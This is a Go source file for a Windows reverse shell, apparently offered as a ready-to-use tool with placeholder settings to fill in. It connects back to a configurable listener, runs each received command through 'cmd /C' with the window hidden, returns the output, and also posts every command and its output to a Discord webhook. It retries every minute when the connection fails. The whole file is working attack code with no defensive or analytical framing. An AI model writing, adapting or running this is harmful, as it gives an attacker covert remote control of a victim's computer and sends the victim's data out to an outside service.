package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os/exec"
	"syscall"
	"time"
)

// Constant declaration
const WEEBHOOK_URL = "https://discord.com/api/webhooks/MY_WEBHOOK" //Change to your webhook url.
const RHOST = "127.0.0.1"                                          //Change to the listener IP
const RPORT = "6666"                                               //Change to the listener Port

// Code
type DiscordWebhook struct {
	Content string `json:"content"`
}

func main() {

	reverse(RHOST + ":" + RPORT)
}

func send_dchook(u string, m string) {
	data := DiscordWebhook{
		Content: m,
	}

	jsonData, _ := json.Marshal(data)

	http.Post(u, "application/json", bytes.NewBuffer(jsonData))
}

func reverse(host string) {

	c, err := net.Dial("tcp", host)
	if err != nil {

		if c != nil {

			c.Close()

		}

		time.Sleep(time.Minute)
		reverse(host)
	}

	r := bufio.NewReader(c)

	for {
		order, err := r.ReadString('\n')

		if err != nil {
			c.Close()
			reverse(host)
			return
		}

		cmd := exec.Command("cmd", "/C", order)

		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		out, err := cmd.CombinedOutput()

		if err != nil {
			out = []byte(err.Error())
		}

		c.Write(append(out, '\a'))

		pretty_string := fmt.Sprintf(`
			REVERSE SHELL OUTPUT:
			Command: %s

			Output: %s
		
		`, string(order), string(out))
		send_dchook(WEEBHOOK_URL, pretty_string)

	}
}
